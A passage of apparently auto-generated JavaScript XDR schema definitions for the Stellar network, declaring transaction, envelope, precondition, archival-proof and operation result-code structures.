            b.struct("HashIdPreimageRevokeId", [["sourceAccount", b.lookup("AccountId")], ["seqNum", b.lookup("SequenceNumber")], ["opNum", b.lookup("Uint32")], ["liquidityPoolId", b.lookup("PoolId")], ["asset", b.lookup("Asset")]]),
            b.struct("HashIdPreimageContractId", [["networkId", b.lookup("Hash")], ["contractIdPreimage", b.lookup("ContractIdPreimage")]]),
            b.struct("HashIdPreimageSorobanAuthorization", [["networkId", b.lookup("Hash")], ["nonce", b.lookup("Int64")], ["signatureExpirationLedger", b.lookup("Uint32")], ["invocation", b.lookup("SorobanAuthorizedInvocation")]]),
            b.union("HashIdPreimage", {
                switchOn: b.lookup("EnvelopeType"),
                switchName: "type",
                switches: [["envelopeTypeOpId", "operationId"], ["envelopeTypePoolRevokeOpId", "revokeId"], ["envelopeTypeContractId", "contractId"], ["envelopeTypeSorobanAuthorization", "sorobanAuthorization"]],
                arms: {
                    operationId: b.lookup("HashIdPreimageOperationId"),
                    revokeId: b.lookup("HashIdPreimageRevokeId"),
                    contractId: b.lookup("HashIdPreimageContractId"),
                    sorobanAuthorization: b.lookup("HashIdPreimageSorobanAuthorization")
                }
            }),
            b.enum("MemoType", {
                memoNone: 0,
                memoText: 1,
                memoId: 2,
                memoHash: 3,
                memoReturn: 4
            }),
            b.union("Memo", {
                switchOn: b.lookup("MemoType"),
                switchName: "type",
                switches: [["memoNone", b.void()], ["memoText", "text"], ["memoId", "id"], ["memoHash", "hash"], ["memoReturn", "retHash"]],
                arms: {
                    text: b.string(28),
                    id: b.lookup("Uint64"),
                    hash: b.lookup("Hash"),
                    retHash: b.lookup("Hash")
                }
            }),
            b.struct("TimeBounds", [["minTime", b.lookup("TimePoint")], ["maxTime", b.lookup("TimePoint")]]),
            b.struct("LedgerBounds", [["minLedger", b.lookup("Uint32")], ["maxLedger", b.lookup("Uint32")]]),
            b.struct("PreconditionsV2", [["timeBounds", b.option(b.lookup("TimeBounds"))], ["ledgerBounds", b.option(b.lookup("LedgerBounds"))], ["minSeqNum", b.option(b.lookup("SequenceNumber"))], ["minSeqAge", b.lookup("Duration")], ["minSeqLedgerGap", b.lookup("Uint32")], ["extraSigners", b.varArray(b.lookup("SignerKey"), 2)]]),
            b.enum("PreconditionType", {
                precondNone: 0,
                precondTime: 1,
                precondV2: 2
            }),
            b.union("Preconditions", {
                switchOn: b.lookup("PreconditionType"),
                switchName: "type",
                switches: [["precondNone", b.void()], ["precondTime", "timeBounds"], ["precondV2", "v2"]],
                arms: {
                    timeBounds: b.lookup("TimeBounds"),
                    v2: b.lookup("PreconditionsV2")
                }
            }),
            b.struct("LedgerFootprint", [["readOnly", b.varArray(b.lookup("LedgerKey"), 2147483647)], ["readWrite", b.varArray(b.lookup("LedgerKey"), 2147483647)]]),
            b.enum("ArchivalProofType", {
                existence: 0,
                nonexistence: 1
            }),
            b.struct("ArchivalProofNode", [["index", b.lookup("Uint32")], ["hash", b.lookup("Hash")]]),
            b.typedef("ProofLevel", b.varArray(b.lookup("ArchivalProofNode"), 2147483647)),
            b.struct("NonexistenceProofBody", [["entriesToProve", b.varArray(b.lookup("ColdArchiveBucketEntry"), 2147483647)], ["proofLevels", b.varArray(b.lookup("ProofLevel"), 2147483647)]]),
            b.struct("ExistenceProofBody", [["keysToProve", b.varArray(b.lookup("LedgerKey"), 2147483647)], ["lowBoundEntries", b.varArray(b.lookup("ColdArchiveBucketEntry"), 2147483647)], ["highBoundEntries", b.varArray(b.lookup("ColdArchiveBucketEntry"), 2147483647)], ["proofLevels", b.varArray(b.lookup("ProofLevel"), 2147483647)]]),
            b.union("ArchivalProofBody", {
                switchOn: b.lookup("ArchivalProofType"),
                switchName: "t",
                switches: [["existence", "nonexistenceProof"], ["nonexistence", "existenceProof"]],
                arms: {
                    nonexistenceProof: b.lookup("NonexistenceProofBody"),
                    existenceProof: b.lookup("ExistenceProofBody")
                }
            }),
            b.struct("ArchivalProof", [["epoch", b.lookup("Uint32")], ["body", b.lookup("ArchivalProofBody")]]),
            b.struct("SorobanResources", [["footprint", b.lookup("LedgerFootprint")], ["instructions", b.lookup("Uint32")], ["readBytes", b.lookup("Uint32")], ["writeBytes", b.lookup("Uint32")]]),
            b.struct("SorobanTransactionData", [["ext", b.lookup("ExtensionPoint")], ["resources", b.lookup("SorobanResources")], ["resourceFee", b.lookup("Int64")]]),
            b.union("TransactionV0Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("TransactionV0", [["sourceAccountEd25519", b.lookup("Uint256")], ["fee", b.lookup("Uint32")], ["seqNum", b.lookup("SequenceNumber")], ["timeBounds", b.option(b.lookup("TimeBounds"))], ["memo", b.lookup("Memo")], ["operations", b.varArray(b.lookup("Operation"), b.lookup("MAX_OPS_PER_TX"))], ["ext", b.lookup("TransactionV0Ext")]]),
            b.struct("TransactionV0Envelope", [["tx", b.lookup("TransactionV0")], ["signatures", b.varArray(b.lookup("DecoratedSignature"), 20)]]),
            b.union("TransactionExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "sorobanData"]],
                arms: {
                    sorobanData: b.lookup("SorobanTransactionData")
                }
            }),
            b.struct("Transaction", [["sourceAccount", b.lookup("MuxedAccount")], ["fee", b.lookup("Uint32")], ["seqNum", b.lookup("SequenceNumber")], ["cond", b.lookup("Preconditions")], ["memo", b.lookup("Memo")], ["operations", b.varArray(b.lookup("Operation"), b.lookup("MAX_OPS_PER_TX"))], ["ext", b.lookup("TransactionExt")]]),
            b.struct("TransactionV1Envelope", [["tx", b.lookup("Transaction")], ["signatures", b.varArray(b.lookup("DecoratedSignature"), 20)]]),
            b.union("FeeBumpTransactionInnerTx", {
                switchOn: b.lookup("EnvelopeType"),
                switchName: "type",
                switches: [["envelopeTypeTx", "v1"]],
                arms: {
                    v1: b.lookup("TransactionV1Envelope")
                }
            }),
            b.union("FeeBumpTransactionExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("FeeBumpTransaction", [["feeSource", b.lookup("MuxedAccount")], ["fee", b.lookup("Int64")], ["innerTx", b.lookup("FeeBumpTransactionInnerTx")], ["ext", b.lookup("FeeBumpTransactionExt")]]),
            b.struct("FeeBumpTransactionEnvelope", [["tx", b.lookup("FeeBumpTransaction")], ["signatures", b.varArray(b.lookup("DecoratedSignature"), 20)]]),
            b.union("TransactionEnvelope", {
                switchOn: b.lookup("EnvelopeType"),
                switchName: "type",
                switches: [["envelopeTypeTxV0", "v0"], ["envelopeTypeTx", "v1"], ["envelopeTypeTxFeeBump", "feeBump"]],
                arms: {
                    v0: b.lookup("TransactionV0Envelope"),
                    v1: b.lookup("TransactionV1Envelope"),
                    feeBump: b.lookup("FeeBumpTransactionEnvelope")
                }
            }),
            b.union("TransactionSignaturePayloadTaggedTransaction", {
                switchOn: b.lookup("EnvelopeType"),
                switchName: "type",
                switches: [["envelopeTypeTx", "tx"], ["envelopeTypeTxFeeBump", "feeBump"]],
                arms: {
                    tx: b.lookup("Transaction"),
                    feeBump: b.lookup("FeeBumpTransaction")
                }
            }),
            b.struct("TransactionSignaturePayload", [["networkId", b.lookup("Hash")], ["taggedTransaction", b.lookup("TransactionSignaturePayloadTaggedTransaction")]]),
            b.enum("ClaimAtomType", {
                claimAtomTypeV0: 0,
                claimAtomTypeOrderBook: 1,
                claimAtomTypeLiquidityPool: 2
            }),
            b.struct("ClaimOfferAtomV0", [["sellerEd25519", b.lookup("Uint256")], ["offerId", b.lookup("Int64")], ["assetSold", b.lookup("Asset")], ["amountSold", b.lookup("Int64")], ["assetBought", b.lookup("Asset")], ["amountBought", b.lookup("Int64")]]),
            b.struct("ClaimOfferAtom", [["sellerId", b.lookup("AccountId")], ["offerId", b.lookup("Int64")], ["assetSold", b.lookup("Asset")], ["amountSold", b.lookup("Int64")], ["assetBought", b.lookup("Asset")], ["amountBought", b.lookup("Int64")]]),
            b.struct("ClaimLiquidityAtom", [["liquidityPoolId", b.lookup("PoolId")], ["assetSold", b.lookup("Asset")], ["amountSold", b.lookup("Int64")], ["assetBought", b.lookup("Asset")], ["amountBought", b.lookup("Int64")]]),
            b.union("ClaimAtom", {
                switchOn: b.lookup("ClaimAtomType"),
                switchName: "type",
                switches: [["claimAtomTypeV0", "v0"], ["claimAtomTypeOrderBook", "orderBook"], ["claimAtomTypeLiquidityPool", "liquidityPool"]],
                arms: {
                    v0: b.lookup("ClaimOfferAtomV0"),
                    orderBook: b.lookup("ClaimOfferAtom"),
                    liquidityPool: b.lookup("ClaimLiquidityAtom")
                }
            }),
            b.enum("CreateAccountResultCode", {
                createAccountSuccess: 0,
                createAccountMalformed: -1,
                createAccountUnderfunded: -2,
                createAccountLowReserve: -3,
                createAccountAlreadyExist: -4
            }),
            b.union("CreateAccountResult", {
                switchOn: b.lookup("CreateAccountResultCode"),
                switchName: "code",
                switches: [["createAccountSuccess", b.void()], ["createAccountMalformed", b.void()], ["createAccountUnderfunded", b.void()], ["createAccountLowReserve", b.void()], ["createAccountAlreadyExist", b.void()]],
                arms: {}
            }),
            b.enum("PaymentResultCode", {
                paymentSuccess: 0,
                paymentMalformed: -1,
                paymentUnderfunded: -2,
                paymentSrcNoTrust: -3,
                paymentSrcNotAuthorized: -4,
                paymentNoDestination: -5,
                paymentNoTrust: -6,
                paymentNotAuthorized: -7,
                paymentLineFull: -8,
                paymentNoIssuer: -9
            }),
            b.union("PaymentResult", {
                switchOn: b.lookup("PaymentResultCode"),
                switchName: "code",
                switches: [["paymentSuccess", b.void()], ["paymentMalformed", b.void()], ["paymentUnderfunded", b.void()], ["paymentSrcNoTrust", b.void()], ["paymentSrcNotAuthorized", b.void()], ["paymentNoDestination", b.void()], ["paymentNoTrust", b.void()], ["paymentNotAuthorized", b.void()], ["paymentLineFull", b.void()], ["paymentNoIssuer", b.void()]],
                arms: {}
            }),
            b.enum("PathPaymentStrictReceiveResultCode", {
                pathPaymentStrictReceiveSuccess: 0,
                pathPaymentStrictReceiveMalformed: -1,
                pathPaymentStrictReceiveUnderfunded: -2,
                pathPaymentStrictReceiveSrcNoTrust: -3,
                pathPaymentStrictReceiveSrcNotAuthorized: -4,
                pathPaymentStrictReceiveNoDestination: -5,
                pathPaymentStrictReceiveNoTrust: -6,
                pathPaymentStrictReceiveNotAuthorized: -7,
                pathPaymentStrictReceiveLineFull: -8,
                pathPaymentStrictReceiveNoIssuer: -9,
                pathPaymentStrictReceiveTooFewOffers: -10,
                pathPaymentStrictReceiveOfferCrossSelf: -11,
                pathPaymentStrictReceiveOverSendmax: -12
            }),
            b.struct("SimplePaymentResult", [["destination", b.lookup("AccountId")], ["asset", b.lookup("Asset")], ["amount", b.lookup("Int64")]]),
            b.struct("PathPaymentStrictReceiveResultSuccess", [["offers", b.varArray(b.lookup("ClaimAtom"), 2147483647)], ["last", b.lookup("SimplePaymentResult")]]),
            b.union("PathPaymentStrictReceiveResult", {
                switchOn: b.lookup("PathPaymentStrictReceiveResultCode"),
                switchName: "code",
                switches: [["pathPaymentStrictReceiveSuccess", "success"], ["pathPaymentStrictReceiveMalformed", b.void()], ["pathPaymentStrictReceiveUnderfunded", b.void()], ["pathPaymentStrictReceiveSrcNoTrust", b.void()], ["pathPaymentStrictReceiveSrcNotAuthorized", b.void()], ["pathPaymentStrictReceiveNoDestination", b.void()], ["pathPaymentStrictReceiveNoTrust", b.void()], ["pathPaymentStrictReceiveNotAuthorized", b.void()], ["pathPaymentStrictReceiveLineFull", b.void()], ["pathPaymentStrictReceiveNoIssuer", "noIssuer"], ["pathPaymentStrictReceiveTooFewOffers", b.void()], ["pathPaymentStrictReceiveOfferCrossSelf", b.void()], ["pathPaymentStrictReceiveOverSendmax", b.void()]],
                arms: {
                    success: b.lookup("PathPaymentStrictReceiveResultSuccess"),
                    noIssuer: b.lookup("Asset")
                }
            }),
            b.enum("PathPaymentStrictSendResultCode", {
                pathPaymentStrictSendSuccess: 0,
                pathPaymentStrictSendMalformed: -1,
                pathPaymentStrictSendUnderfunded: -2,
                pathPaymentStrictSendSrcNoTrust: -3,
                pathPaymentStrictSendSrcNotAuthorized: -4,
                pathPaymentStrictSendNoDestination: -5,
                pathPaymentStrictSendNoTrust: -6,
                pathPaymentStrictSendNotAuthorized: -7,
                pathPaymentStrictSendLineFull: -8,
                pathPaymentStrictSendNoIssuer: -9,
                pathPaymentStrictSendTooFewOffers: -10,
                pathPaymentStrictSendOfferCrossSelf: -11,
                pathPaymentStrictSendUnderDestmin: -12
            }),
            b.struct("PathPaymentStrictSendResultSuccess", [["offers", b.varArray(b.lookup("ClaimAtom"), 2147483647)], ["last", b.lookup("SimplePaymentResult")]]),
            b.union("PathPaymentStrictSendResult", {
                switchOn: b.lookup("PathPaymentStrictSendResultCode"),
                switchName: "code",
                switches: [["pathPaymentStrictSendSuccess", "success"], ["pathPaymentStrictSendMalformed", b.void()], ["pathPaymentStrictSendUnderfunded", b.void()], ["pathPaymentStrictSendSrcNoTrust", b.void()], ["pathPaymentStrictSendSrcNotAuthorized", b.void()], ["pathPaymentStrictSendNoDestination", b.void()], ["pathPaymentStrictSendNoTrust", b.void()], ["pathPaymentStrictSendNotAuthorized", b.void()], ["pathPaymentStrictSendLineFull", b.void()], ["pathPaymentStrictSendNoIssuer", "noIssuer"], ["pathPaymentStrictSendTooFewOffers", b.void()], ["pathPaymentStrictSendOfferCrossSelf", b.void()], ["pathPaymentStrictSendUnderDestmin", b.void()]],
                arms: {
                    success: b.lookup("PathPaymentStrictSendResultSuccess"),
                    noIssuer: b.lookup("Asset")
                }
            }),
            b.enum("ManageSellOfferResultCode", {
                manageSellOfferSuccess: 0,
                manageSellOfferMalformed: -1,
                manageSellOfferSellNoTrust: -2,
                manageSellOfferBuyNoTrust: -3,
                manageSellOfferSellNotAuthorized: -4,
                manageSellOfferBuyNotAuthorized: -5,
                manageSellOfferLineFull: -6,
                manageSellOfferUnderfunded: -7,
                manageSellOfferCrossSelf: -8,
                manageSellOfferSellNoIssuer: -9,
                manageSellOfferBuyNoIssuer: -10,
                manageSellOfferNotFound: -11,
                manageSellOfferLowReserve: -12
            }),
            b.enum("ManageOfferEffect", {
                manageOfferCreated: 0,
                manageOfferUpdated: 1,
                manageOfferDeleted: 2
            }),
            b.union("ManageOfferSuccessResultOffer", {
                switchOn: b.lookup("ManageOfferEffect"),
                switchName: "effect",
                switches: [["manageOfferCreated", "offer"], ["manageOfferUpdated", "offer"], ["manageOfferDeleted", b.void()]],
                arms: {
                    offer: b.lookup("OfferEntry")
                }
            }),
            b.struct("ManageOfferSuccessResult", [["offersClaimed", b.varArray(b.lookup("ClaimAtom"), 2147483647)], ["offer", b.lookup("ManageOfferSuccessResultOffer")]]),
            b.union("ManageSellOfferResult", {
                switchOn: b.lookup("ManageSellOfferResultCode"),
                switchName: "code",
                switches: [["manageSellOfferSuccess", "success"], ["manageSellOfferMalformed", b.void()], ["manageSellOfferSellNoTrust", b.void()], ["manageSellOfferBuyNoTrust", b.void()], ["manageSellOfferSellNotAuthorized", b.void()], ["manageSellOfferBuyNotAuthorized", b.void()], ["manageSellOfferLineFull", b.void()], ["manageSellOfferUnderfunded", b.void()], ["manageSellOfferCrossSelf", b.void()], ["manageSellOfferSellNoIssuer", b.void()], ["manageSellOfferBuyNoIssuer", b.void()], ["manageSellOfferNotFound", b.void()], ["manageSellOfferLowReserve", b.void()]],
                arms: {
                    success: b.lookup("ManageOfferSuccessResult")
                }
            }),
            b.enum("ManageBuyOfferResultCode", {
                manageBuyOfferSuccess: 0,
                manageBuyOfferMalformed: -1,
                manageBuyOfferSellNoTrust: -2,
                manageBuyOfferBuyNoTrust: -3,
                manageBuyOfferSellNotAuthorized: -4,
                manageBuyOfferBuyNotAuthorized: -5,
                manageBuyOfferLineFull: -6,
                manageBuyOfferUnderfunded: -7,
                manageBuyOfferCrossSelf: -8,
                manageBuyOfferSellNoIssuer: -9,
                manageBuyOfferBuyNoIssuer: -10,
                manageBuyOfferNotFound: -11,
                manageBuyOfferLowReserve: -12
            }),
            b.union("ManageBuyOfferResult", {
                switchOn: b.lookup("ManageBuyOfferResultCode"),
                switchName: "code",
                switches: [["manageBuyOfferSuccess", "success"], ["manageBuyOfferMalformed", b.void()], ["manageBuyOfferSellNoTrust", b.void()], ["manageBuyOfferBuyNoTrust", b.void()], ["manageBuyOfferSellNotAuthorized", b.void()], ["manageBuyOfferBuyNotAuthorized", b.void()], ["manageBuyOfferLineFull", b.void()], ["manageBuyOfferUnderfunded", b.void()], ["manageBuyOfferCrossSelf", b.void()], ["manageBuyOfferSellNoIssuer", b.void()], ["manageBuyOfferBuyNoIssuer", b.void()], ["manageBuyOfferNotFound", b.void()], ["manageBuyOfferLowReserve", b.void()]],
                arms: {
                    success: b.lookup("ManageOfferSuccessResult")
                }
            }),
            b.enum("SetOptionsResultCode", {
                setOptionsSuccess: 0,
                setOptionsLowReserve: -1,
                setOptionsTooManySigners: -2,
                setOptionsBadFlags: -3,
                setOptionsInvalidInflation: -4,
                setOptionsCantChange: -5,
                setOptionsUnknownFlag: -6,
                setOptionsThresholdOutOfRange: -7,
                setOptionsBadSigner: -8,
                setOptionsInvalidHomeDomain: -9,
                setOptionsAuthRevocableRequired: -10
            }),
            b.union("SetOptionsResult", {
                switchOn: b.lookup("SetOptionsResultCode"),
                switchName: "code",
                switches: [["setOptionsSuccess", b.void()], ["setOptionsLowReserve", b.void()], ["setOptionsTooManySigners", b.void()], ["setOptionsBadFlags", b.void()], ["setOptionsInvalidInflation", b.void()], ["setOptionsCantChange", b.void()], ["setOptionsUnknownFlag", b.void()], ["setOptionsThresholdOutOfRange", b.void()], ["setOptionsBadSigner", b.void()], ["setOptionsInvalidHomeDomain", b.void()], ["setOptionsAuthRevocableRequired", b.void()]],
                arms: {}
            }),
            b.enum("ChangeTrustResultCode", {
                changeTrustSuccess: 0,
                changeTrustMalformed: -1,
                changeTrustNoIssuer: -2,
                changeTrustInvalidLimit: -3,
                changeTrustLowReserve: -4,
                changeTrustSelfNotAllowed: -5,
                changeTrustTrustLineMissing: -6,
                changeTrustCannotDelete: -7,
                changeTrustNotAuthMaintainLiabilities: -8
            }),
            b.union("ChangeTrustResult", {
                switchOn: b.lookup("ChangeTrustResultCode"),
                switchName: "code",
                switches: [["changeTrustSuccess", b.void()], ["changeTrustMalformed", b.void()], ["changeTrustNoIssuer", b.void()], ["changeTrustInvalidLimit", b.void()], ["changeTrustLowReserve", b.void()], ["changeTrustSelfNotAllowed", b.void()], ["changeTrustTrustLineMissing", b.void()], ["changeTrustCannotDelete", b.void()], ["changeTrustNotAuthMaintainLiabilities", b.void()]],
                arms: {}
            }),
            b.enum("AllowTrustResultCode", {
                allowTrustSuccess: 0,
                allowTrustMalformed: -1,
                allowTrustNoTrustLine: -2,
                allowTrustTrustNotRequired: -3,
                allowTrustCantRevoke: -4,
                allowTrustSelfNotAllowed: -5,
                allowTrustLowReserve: -6
            }),
            b.union("AllowTrustResult", {
                switchOn: b.lookup("AllowTrustResultCode"),
                switchName: "code",
                switches: [["allowTrustSuccess", b.void()], ["allowTrustMalformed", b.void()], ["allowTrustNoTrustLine", b.void()], ["allowTrustTrustNotRequired", b.void()], ["allowTrustCantRevoke", b.void()], ["allowTrustSelfNotAllowed", b.void()], ["allowTrustLowReserve", b.void()]],
                arms: {}
            }),
            b.enum("AccountMergeResultCode", {
                accountMergeSuccess: 0,
                accountMergeMalformed: -1,
                accountMergeNoAccount: -2,
                accountMergeImmutableSet: -3,
                accountMergeHasSubEntries: -4,
                accountMergeSeqnumTooFar: -5,
                accountMergeDestFull: -6,
                accountMergeIsSponsor: -7
            }),
            b.union("AccountMergeResult", {
                switchOn: b.lookup("AccountMergeResultCode"),
                switchName: "code",
                switches: [["accountMergeSuccess", "sourceAccountBalance"], ["accountMergeMalformed", b.void()], ["accountMergeNoAccount", b.void()], ["accountMergeImmutableSet", b.void()], ["accountMergeHasSubEntries", b.void()], ["accountMergeSeqnumTooFar", b.void()], ["accountMergeDestFull", b.void()], ["accountMergeIsSponsor", b.void()]],
                arms: {
                    sourceAccountBalance: b.lookup("Int64")
                }
            }),
            b.enum("InflationResultCode", {
                inflationSuccess: 0,
                inflationNotTime: -1
            }),
            b.struct("InflationPayout", [["destination", b.lookup("AccountId")], ["amount", b.lookup("Int64")]]),
            b.union("InflationResult", {
                switchOn: b.lookup("InflationResultCode"),
                switchName: "code",
                switches: [["inflationSuccess", "payouts"], ["inflationNotTime", b.void()]],
                arms: {
                    payouts: b.varArray(b.lookup("InflationPayout"), 2147483647)
                }
            }),
            b.enum("ManageDataResultCode", {
                manageDataSuccess: 0,
                manageDataNotSupportedYet: -1,
                manageDataNameNotFound: -2,
                manageDataLowReserve: -3,
                manageDataInvalidName: -4
            }),
            b.union("ManageDataResult", {
                switchOn: b.lookup("ManageDataResultCode"),
                switchName: "code",
                switches: [["manageDataSuccess", b.void()], ["manageDataNotSupportedYet", b.void()], ["manageDataNameNotFound", b.void()], ["manageDataLowReserve", b.void()], ["manageDataInvalidName", b.void()]],
                arms: {}
            }),
            b.enum("BumpSequenceResultCode", {
                bumpSequenceSuccess: 0,
                bumpSequenceBadSeq: -1
            }),
            b.union("BumpSequenceResult", {
                switchOn: b.lookup("BumpSequenceResultCode"),
                switchName: "code",
                switches: [["bumpSequenceSuccess", b.void()], ["bumpSequenceBadSeq", b.void()]],
                arms: {}
            }),
            b.enum("CreateClaimableBalanceResultCode", {
                createClaimableBalanceSuccess: 0,
                createClaimableBalanceMalformed: -1,
                createClaimableBalanceLowReserve: -2,
                createClaimableBalanceNoTrust: -3,
                createClaimableBalanceNotAuthorized: -4,
                createClaimableBalanceUnderfunded: -5
            }),
            b.union("CreateClaimableBalanceResult", {
                switchOn: b.lookup("CreateClaimableBalanceResultCode"),
                switchName: "code",
                switches: [["createClaimableBalanceSuccess", "balanceId"], ["createClaimableBalanceMalformed", b.void()], ["createClaimableBalanceLowReserve", b.void()], ["createClaimableBalanceNoTrust", b.void()], ["createClaimableBalanceNotAuthorized", b.void()], ["createClaimableBalanceUnderfunded", b.void()]],
                arms: {
                    balanceId: b.lookup("ClaimableBalanceId")
                }
            }),
            b.enum("ClaimClaimableBalanceResultCode", {
                claimClaimableBalanceSuccess: 0,
                claimClaimableBalanceDoesNotExist: -1,
                claimClaimableBalanceCannotClaim: -2,
                claimClaimableBalanceLineFull: -3,
                claimClaimableBalanceNoTrust: -4,
                claimClaimableBalanceNotAuthorized: -5
            }),
            b.union("ClaimClaimableBalanceResult", {
                switchOn: b.lookup("ClaimClaimableBalanceResultCode"),
                switchName: "code",
                switches: [["claimClaimableBalanceSuccess", b.void()], ["claimClaimableBalanceDoesNotExist", b.void()], ["claimClaimableBalanceCannotClaim", b.void()], ["claimClaimableBalanceLineFull", b.void()], ["claimClaimableBalanceNoTrust", b.void()], ["claimClaimableBalanceNotAuthorized", b.void()]],
                arms: {}
            }),
            b.enum("BeginSponsoringFutureReservesResultCode", {
                beginSponsoringFutureReservesSuccess: 0,
                beginSponsoringFutureReservesMalformed: -1,
                beginSponsoringFutureReservesAlreadySponsored: -2,
                beginSponsoringFutureReservesRecursive: -3
            }),
            b.union("BeginSponsoringFutureReservesResult", {
                switchOn: b.lookup("BeginSponsoringFutureReservesResultCode"),
                switchName: "code",
                switches: [["beginSponsoringFutureReservesSuccess", b.void()], ["beginSponsoringFutureReservesMalformed", b.void()], ["beginSponsoringFutureReservesAlreadySponsored", b.void()], ["beginSponsoringFutureReservesRecursive", b.void()]],
                arms: {}
            }),
            b.enum("EndSponsoringFutureReservesResultCode", {
                endSponsoringFutureReservesSuccess: 0,
                endSponsoringFutureReservesNotSponsored: -1
            }),
            b.union("EndSponsoringFutureReservesResult", {
                switchOn: b.lookup("EndSponsoringFutureReservesResultCode"),
                switchName: "code",
                switches: [["endSponsoringFutureReservesSuccess", b.void()], ["endSponsoringFutureReservesNotSponsored", b.void()]],
                arms: {}
            }),
            b.enum("RevokeSponsorshipResultCode", {
                revokeSponsorshipSuccess: 0,
                revokeSponsorshipDoesNotExist: -1,
                revokeSponsorshipNotSponsor: -2,
                revokeSponsorshipLowReserve: -3,
                revokeSponsorshipOnlyTransferable: -4,
                revokeSponsorshipMalformed: -5
            }),
            b.union("RevokeSponsorshipResult", {
                switchOn: b.lookup("RevokeSponsorshipResultCode"),
                switchName: "code",
                switches: [["revokeSponsorshipSuccess", b.void()], ["revokeSponsorshipDoesNotExist", b.void()], ["revokeSponsorshipNotSponsor", b.void()], ["revokeSponsorshipLowReserve", b.void()], ["revokeSponsorshipOnlyTransferable", b.void()], ["revokeSponsorshipMalformed", b.void()]],
                arms: {}
            }),
            b.enum("ClawbackResultCode", {
                clawbackSuccess: 0,
                clawbackMalformed: -1,
                clawbackNotClawbackEnabled: -2,
                clawbackNoTrust: -3,
                clawbackUnderfunded: -4
            }),
            b.union("ClawbackResult", {
                switchOn: b.lookup("ClawbackResultCode"),
                switchName: "code",
                switches: [["clawbackSuccess", b.void()], ["clawbackMalformed", b.void()], ["clawbackNotClawbackEnabled", b.void()], ["clawbackNoTrust", b.void()], ["clawbackUnderfunded", b.void()]],
                arms: {}
            }),
            b.enum("ClawbackClaimableBalanceResultCode", {
                clawbackClaimableBalanceSuccess: 0,
                clawbackClaimableBalanceDoesNotExist: -1,
                clawbackClaimableBalanceNotIssuer: -2,
                clawbackClaimableBalanceNotClawbackEnabled: -3
            }),
            b.union("ClawbackClaimableBalanceResult", {
                switchOn: b.lookup("ClawbackClaimableBalanceResultCode"),
                switchName: "code",
                switches: [["clawbackClaimableBalanceSuccess", b.void()], ["clawbackClaimableBalanceDoesNotExist", b.void()], ["clawbackClaimableBalanceNotIssuer", b.void()], ["clawbackClaimableBalanceNotClawbackEnabled", b.void()]],
                arms: {}
            }),
            b.enum("SetTrustLineFlagsResultCode", {
                setTrustLineFlagsSuccess: 0,
                setTrustLineFlagsMalformed: -1,
                setTrustLineFlagsNoTrustLine: -2,
                setTrustLineFlagsCantRevoke: -3,
                setTrustLineFlagsInvalidState: -4,
                setTrustLineFlagsLowReserve: -5
            }),
            b.union("SetTrustLineFlagsResult", {
                switchOn: b.lookup("SetTrustLineFlagsResultCode"),
                switchName: "code",
                switches: [["setTrustLineFlagsSuccess", b.void()], ["setTrustLineFlagsMalformed", b.void()], ["setTrustLineFlagsNoTrustLine", b.void()], ["setTrustLineFlagsCantRevoke", b.void()], ["setTrustLineFlagsInvalidState", b.void()], ["setTrustLineFlagsLowReserve", b.void()]],
                arms: {}
            }),
            b.enum("LiquidityPoolDepositResultCode", {
                liquidityPoolDepositSuccess: 0,
                liquidityPoolDepositMalformed: -1,
                liquidityPoolDepositNoTrust: -2,
                liquidityPoolDepositNotAuthorized: -3,
                liquidityPoolDepositUnderfunded: -4,
                liquidityPoolDepositLineFull: -5,
                liquidityPoolDepositBadPrice: -6,
                liquidityPoolDepositPoolFull: -7
            }),
            b.union("LiquidityPoolDepositResult", {
                switchOn: b.lookup("LiquidityPoolDepositResultCode"),
                switchName: "code",
                switches: [["liquidityPoolDepositSuccess", b.void()], ["liquidityPoolDepositMalformed", b.void()], ["liquidityPoolDepositNoTrust", b.void()], ["liquidityPoolDepositNotAuthorized", b.void()], ["liquidityPoolDepositUnderfunded", b.void()], ["liquidityPoolDepositLineFull", b.void()], ["liquidityPoolDepositBadPrice", b.void()], ["liquidityPoolDepositPoolFull", b.void()]],
                arms: {}
            }),
            b.enum("LiquidityPoolWithdrawResultCode", {
                liquidityPoolWithdrawSuccess: 0,
                liquidityPoolWithdrawMalformed: -1,
                liquidityPoolWithdrawNoTrust: -2,
                liquidityPoolWithdrawUnderfunded: -3,
                liquidityPoolWithdrawLineFull: -4,
                liquidityPoolWithdrawUnderMinimum: -5
            }),
            b.union("LiquidityPoolWithdrawResult", {
                switchOn: b.lookup("LiquidityPoolWithdrawResultCode"),
                switchName: "code",
                switches: [["liquidityPoolWithdrawSuccess", b.void()], ["liquidityPoolWithdrawMalformed", b.void()], ["liquidityPoolWithdrawNoTrust", b.void()], ["liquidityPoolWithdrawUnderfunded", b.void()], ["liquidityPoolWithdrawLineFull", b.void()], ["liquidityPoolWithdrawUnderMinimum", b.void()]],
                arms: {}
            }),
            b.enum("InvokeHostFunctionResultCode", {
                invokeHostFunctionSuccess: 0,
                invokeHostFunctionMalformed: -1,
                invokeHostFunctionTrapped: -2,
                invokeHostFunctionResourceLimitExceeded: -3,
                invokeHostFunctionEntryArchived: -4,
                invokeHostFunctionInsufficientRefundableFee: -5
            }),
            b.union("InvokeHostFunctionResult", {
                switchOn: b.lookup("InvokeHostFunctionResultCode"),
                switchName: "code",
                switches: [["invokeHostFunctionSuccess", "success"], ["invokeHostFunctionMalformed", b.void()], ["invokeHostFunctionTrapped", b.void()], ["invokeHostFunctionResourceLimitExceeded", b.void()], ["invokeHostFunctionEntryArchived", b.void()], ["invokeHostFunctionInsufficientRefundableFee", b.void()]],
                arms: {
                    success: b.lookup("Hash")
                }
            }),
            b.enum("ExtendFootprintTtlResultCode", {
                extendFootprintTtlSuccess: 0,
                extendFootprintTtlMalformed: -1,
                extendFootprintTtlResourceLimitExceeded: -2,
                extendFootprintTtlInsufficientRefundableFee: -3
            }),
            b.union("ExtendFootprintTtlResult", {
                switchOn: b.lookup("ExtendFootprintTtlResultCode"),
                switchName: "code",
                switches: [["extendFootprintTtlSuccess", b.void()], ["extendFootprintTtlMalformed", b.void()], ["extendFootprintTtlResourceLimitExceeded", b.void()], ["extendFootprintTtlInsufficientRefundableFee", b.void()]],
                arms: {}
            }),
            b.enum("RestoreFootprintResultCode", {
                restoreFootprintSuccess: 0,
                restoreFootprintMalformed: -1,
